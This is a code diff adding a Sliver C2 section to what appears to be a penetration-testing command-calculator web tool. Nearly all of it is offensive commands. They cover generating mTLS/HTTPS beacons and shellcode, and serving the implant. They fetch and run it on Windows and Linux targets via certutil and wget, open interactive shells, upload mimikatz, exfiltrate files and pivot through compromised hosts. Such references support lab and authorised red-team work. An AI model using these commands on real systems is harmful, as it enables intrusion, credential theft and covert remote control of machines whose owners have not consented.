@@ -631,6 +631,62 @@ export default function CommandCalculator() {
         ]},
       ],
     },
+    sliver: {
+      name: "Sliver C2", groups: [
+        { phase: "0 — Start the server", cmds: [
+          { label: "0.1  Launch Sliver", cmd: `sliver-server`, note: "Starts the server + drops you into the operator console. Or 'sliver' if the server daemon is already running." },
+          { label: "0.2  Multiplayer — add an operator", cmd: `new-operator --name kali --lhost ${LHOST} --save /tmp/kali.cfg`, note: "Generates a client config. Import it on a second machine with: sliver import /tmp/kali.cfg" },
+        ]},
+        { phase: "1 — Start a listener", cmds: [
+          { label: "1.1  mTLS listener (preferred)", cmd: `mtls --lport 8888`, note: "Encrypted, no proxy needed. Use this unless the target filters non-HTTP." },
+          { label: "1.2  HTTPS listener", cmd: `https --lhost ${LHOST} --lport 443`, note: "Blends with web traffic — use when egress only allows 80/443." },
+          { label: "1.3  HTTP listener", cmd: `http --lhost ${LHOST} --lport 80`, note: "Unencrypted fallback. Fine for labs, never for real." },
+          { label: "1.4  Verify listeners are up", cmd: `jobs`, note: "Every listener is a job. No job listed = nothing is catching callbacks." },
+          { label: "1.5  Kill a listener", cmd: `jobs -k <JOB_ID>` },
+        ]},
+        { phase: "2 — Generate implants", cmds: [
+          { label: "2.1  Windows beacon (mTLS)", cmd: `generate beacon --mtls ${LHOST}:8888 --os windows --arch amd64 --format exe --seconds 5 --jitter 3 --name ${FN}`, note: "Double-dash on EVERY flag. -os is parsed as -o s and silently breaks." },
+          { label: "2.2  Linux beacon (mTLS) — ELF", cmd: `generate beacon --mtls ${LHOST}:8888 --os linux --arch amd64 --format elf --seconds 5 --jitter 3 --name ${FN}`, note: "--format elf for Linux. The output is an ELF binary — chmod +x it on the target." },
+          { label: "2.3  Windows beacon (HTTPS)", cmd: `generate beacon --https ${LHOST}:443 --os windows --arch amd64 --format exe --seconds 5 --jitter 3 --name ${FN}` },
+          { label: "2.4  Linux beacon (HTTPS)", cmd: `generate beacon --https ${LHOST}:443 --os linux --arch amd64 --format elf --seconds 5 --jitter 3 --name ${FN}` },
+          { label: "2.5  Shellcode (for injection)", cmd: `generate beacon --mtls ${LHOST}:8888 --os windows --arch amd64 --format shellcode --name ${FN}`, note: "Raw shellcode — feed it to a loader, not a direct exec." },
+          { label: "2.6  Session (interactive, not beacon)", cmd: `generate --mtls ${LHOST}:8888 --os windows --arch amd64 --format exe --name ${FN}`, note: "No 'beacon' keyword = session mode. Persistent connection, noisier, but real-time interaction." },
+          { label: "2.7  Failover (try mTLS, fall back to HTTPS)", cmd: `generate beacon --mtls ${LHOST}:8888 --https ${LHOST}:443 --os windows --format exe --seconds 5 --jitter 3 --name ${FN}`, note: "Tries transports left to right. Both listeners must be running." },
+          { label: "2.8  List previously generated implants", cmd: `implants`, note: "Shows every implant you've built, with its config. Re-download with: implants regenerate --name <NAME>" },
+        ]},
+        { phase: "3 — Deploy + catch", cmds: [
+          { label: "3.1  Serve it (Kali)", cmd: `python3 -m http.server ${SRVPORT}`, note: "From the directory Sliver saved the implant to." },
+          { label: "3.2  Pull + run (Windows target)", cmd: `certutil -urlcache -f http://${LHOST}:${SRVPORT}/${FN} C:\\Windows\\Temp\\${FN}\nC:\\Windows\\Temp\\${FN}` },
+          { label: "3.3  Pull + run (Linux target)", cmd: `wget http://${LHOST}:${SRVPORT}/${FN} -O /tmp/${FN} && chmod +x /tmp/${FN} && /tmp/${FN}` },
+          { label: "3.4  Wait for callback", cmd: `beacons`, note: "Watch the Sliver console. A new line appears when the beacon checks in. Sessions show with: sessions." },
+        ]},
+        { phase: "4 — Interact", cmds: [
+          { label: "4.1  Use a beacon", cmd: `use <BEACON_ID>`, note: "Tab-complete works on IDs. Beacon commands queue until the next check-in." },
+          { label: "4.2  Use a session", cmd: `use <SESSION_ID>`, note: "Sessions are real-time — output returns immediately." },
+          { label: "4.3  Interactive shell from a beacon", cmd: `interactive`, note: "Upgrades a beacon to a session for real-time interaction. Noisier." },
+          { label: "4.4  Run a command", cmd: `shell\nwhoami`, note: "Opens a shell channel. Type 'exit' to close the shell channel, not the beacon." },
+          { label: "4.5  Execute a single command", cmd: `execute -o whoami`, note: "-o shows output. Without it the command runs but you see nothing." },
+        ]},
+        { phase: "5 — Post-exploitation", cmds: [
+          { label: "5.1  Upload a file", cmd: `upload /home/kali/tools/mimikatz.exe C:\\Windows\\Temp\\mimikatz.exe` },
+          { label: "5.2  Download a file", cmd: `download C:\\Users\\Administrator\\Desktop\\proof.txt /home/kali/loot/` },
+          { label: "5.3  Process list", cmd: `ps` },
+          { label: "5.4  Network info", cmd: `ifconfig\nnetstat` },
+          { label: "5.5  Pivot — add a listener through the implant", cmd: `pivot tcp --bind 0.0.0.0:1234`, note: "Opens a port on the compromised host. Generate a new implant with --tcp <pivot_host>:1234 to chain through it." },
+        ]},
+        { phase: "6 — VERIFY it's working", cmds: [
+          { label: "6.1  Beacon checking in?", cmd: `beacons`, note: "Last check-in time tells you if it's alive. Stale = the process died or the network path broke." },
+          { label: "6.2  Listener actually up?", cmd: `jobs`, note: "No jobs = nothing catching callbacks. Start the listener BEFORE deploying the implant." },
+          { label: "6.3  Task stuck?", cmd: `tasks`, note: "Beacon tasks queue. If the beacon died before checking in, queued tasks never execute." },
+        ]},
+        { phase: "7 — Error decoder", cmds: [
+          { label: "invalid compiler target: s/amd64", cmd: `# You wrote -os instead of --os. Single-dash parsed -o with value 's'.\n# Fix: --os windows  (double dash on every flag)`, note: "The #1 Sliver gotcha. -os is NOT --os. This session learned it the hard way." },
+          { label: "Beacon never checks in", cmd: `jobs                     # listener up?\necho $LHOST              # is this the IP the target can reach (tun0, not eth0)?`, note: "Three causes: listener not running, wrong LHOST baked into the implant, or egress filtering on the target." },
+          { label: "Beacon checks in then drops", cmd: `# Regenerated server certs (~/.sliver/) invalidated old implants.\n# Every implant's cert was signed by the old CA — regenerate the implant.`, note: "Symptom: connects, immediately disconnects. Cause: CA mismatch after a server reinstall." },
+          { label: "Can't switch transport on a running beacon", cmd: `# Transport is baked in at generation time. An HTTP implant can't\n# speak mTLS. Regenerate with the new transport and re-deploy.`, note: "There's no 'switch to mTLS' command. Build a new implant." },
+        ]},
+      ],
+    },
     payloads: {
       name: "Payloads / Shells", groups: [
         { phase: "msfvenom", cmds: [
